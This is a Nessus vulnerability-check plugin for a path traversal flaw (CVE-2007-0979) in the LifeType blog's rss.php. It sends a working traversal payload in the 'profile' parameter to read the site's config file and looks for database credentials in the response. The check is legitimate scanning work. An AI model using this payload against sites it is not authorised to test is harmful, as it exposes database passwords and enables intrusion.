#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24356);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-0979");
  script_bugtraq_id(22572);
  script_osvdb_id(33210);

  script_name(english:"LifeType rss.php profile Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read the configuration file for LifeType");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LifeType, an open source blogging platform
written in PHP. 

The version of LifeType installed on the remote host fails to sanitize
input to the 'profile' parameter of the 'rss.php' script of directory
traversal sequences.  An unauthenticated, remote attacker is able to
leverage this flaw to read files on the affected host and disclose
sensitive information, such as configuration parameters used by the
application." );
  # http://web.archive.org/web/20070303115513/http://www.lifetype.net/blog/lifetype-development-journal/2007/02/14/critical-security-issue-lifetype-1.1.6-and-lifetype-1.2-beta2-released
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bc5c2a48" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Lifetype 1.1.6 / 1.2-beta2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(200);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/02/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/14");
 script_cvs_date("$Date: 2015/09/24 21:17:11 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:lifetype:lifetype");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/lifetype", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read the config file.
  file = "../../config/config.properties.php%00";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/rss.php?",
      "blogId=1&",
      "profile=", file
    ),
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if it looks like the config file.
  if (
    "$config" >< res &&
    res =~ "\$config\[.db_(host|username|password).\].*="
  )
  {
    report = string(
      "\n",
      "Here are the contents of the file 'config/config.properties.php' file\n",
      "that Nessus was able to read from the remote host :\n",
      "\n",
      res
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
